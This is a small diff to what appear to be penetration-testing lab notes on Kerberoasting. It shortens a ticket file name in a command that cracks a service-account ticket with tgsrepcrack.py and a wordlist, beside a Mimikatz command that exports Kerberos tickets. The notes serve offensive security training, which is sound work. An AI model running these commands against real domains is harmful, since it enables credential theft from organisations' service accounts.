@@ -186,7 +186,7 @@ Invoke-Mimikatz -Command '"Kerberos::list /export"'
 #### Crack the ticket
 - Crack the password for the serviceaccount
 ```
-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\ticket.kirbi
 ```
 
 ```
